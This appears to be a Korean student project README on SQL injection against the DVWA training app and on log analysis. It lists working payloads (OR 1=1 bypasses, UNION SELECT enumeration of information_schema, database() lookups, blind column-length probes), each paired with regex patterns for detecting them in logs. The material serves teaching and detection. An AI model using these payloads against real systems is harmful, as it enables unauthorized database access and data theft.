## SQL Injection 구현 및 log 분석
SQL injection: 주민서, 이종학

log 분석: 김현서, 허남정, 오성택

---
### 0. SQL Injection
코드 참조

---
### 1. 조건문을 이용한 SQL Injection
이 유형의 payload는 WHERE절의 조건을 항상 참으로 만들어 조건을 우회하는 방법 입니다.
- ' OR 1=1 #
- ' OR TRUE #
- ' OR '1'='1' #
- ' OR '1'='1' LIMIT 1 #
- ' OR TRUE LIMIT 1 #
- ' OR 1=1 LIMIT 5 #

이런 payload는 다음과 같은 쿼리가 있다고 가정했을 때 사용합니다.

SELECT * FROM table WHERE id = 'sql_injection' AND pw = 'sql_injection’

WHERE절의 조건이 항상 참이 되므로 모든 행이 반환됩니다.

표현식
- (\d)*?'\s*?or\s(1=1|true|\'\d*\'=\'\d*\')
- or\s+('1'='1'|true|1=1)

---
### 2. UNION SELECT
UNION은 두 개 이상의 SELECT문의 결과를 하나의 결과로 만들어줍니다. 이때 각 SELECT문은 같은 수의 컬럼을 가져야 하며, 각 열의 데이터 타입이 일치해야 합니다. 이러한 특성을 이용해 데이터베이스의 구조나 정보를 알아낼 수 있습니다. 사용된 payload를 확인해보면 컬럼의 길이, 테이블 이름, 컬럼의 데이터를 알아내는데 사용되었습니다.
- ' UNION SELECT 1 #
- ' UNION SELECT 1, 2 #
- ' UNION SELECT 1, 2, 3 #
- ' UNION SELECT 1, table_name FROM information_schema.tables #
- ' UNION SELECT table_name,2 FROM information_schema.tables #
- ' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa' #
- ' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='dvwa' #
- ' UNION SELECT 1,column_name from information_schema.columns WHERE table_name='guestbook' LIMIT 2,1 #
- ' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='guestbook' LIMIT 2,1 #
- ' UNION select 1,column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' and table_schema='dvwa' #

위 예시의 쿼리문들을 이용해 컬럼의 개수 및 데이터베이스의 정보, 컬럼의 이름 등을 알아내는데 사용할 수 있습니다.

표현식
- (\d)*?\'\s*?union\sselect\s(\d+\s*?\,\s*?)*\d+\s*?(#)
- (\d)*?\'\s*?union\sselect\s(\d*?\s*?\,\s*?)*\d*?\s*?table_name\s(\d*?\s*?\,\s*?)*\d*?\s*?from\sinformation_schema\.tables\s(where\stable_schema\s*?\=\s*?\'(.*)\')*?
- select \d+(\s*,\s*\d+)+
- select.*table_name.*from\s*information_schema.tables
- (\d)*?\'\s*?union\sselect\s(\d*?\s*?\,\s*?)*\d*?\s*?column_name
- select.*column_name.*from\s*information_schema.columns

---
### 3. DB 정보 확인
database() 함수는 MySQL에서 현재 연결된 데이터베이스의 이름을 반환합니다. 이 함수를 사용해 현재 사용중인 데이터베이스의 이름을 알아내 데이터베이스의 구조를 파악해 SQL 인젝션 공격을 계획할 수 있게 됩니다.
- ' UNION SELECT 1,database() #`
- ' UNION SELECT database(), 2 #`

표현식
- (\d)*?\'\s*?union\sselect\s(\d*?\s*?\,\s*?)*\d*?\s*?database\(\)
- select.*database()

---
### 4. 컬럼 길이 확인
특정 테이블의 컬럼 이름 길이를 알아내기 위한 payload입니다. information_schema.columns과 LENGTH() 함수를 이용해 특정 테이블의 컬럼 이름의 길이를 추측해 데이터베이스 구조를 탐색합니다.
- '1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=1) #`
- '1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=2) #`
- '1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=3) #`

위 쿼리를 보면 이름의 길이를 순차적으로 증가시키며, 데이터베이스 구조를 탐색하려는 의도임을 알 수 있습니다.

표현식
- (\d)*?\'\s*?and\s\(select\s\d\sfrom\sinformation_schema\.columns\swhere\stable_schema\=\'(.*)\'(\sand\stable_name\=\'(.*)\')*?(\sand\slength\(column_name\)\=\d)*?
- select.*from.*where.*length\(.*\)
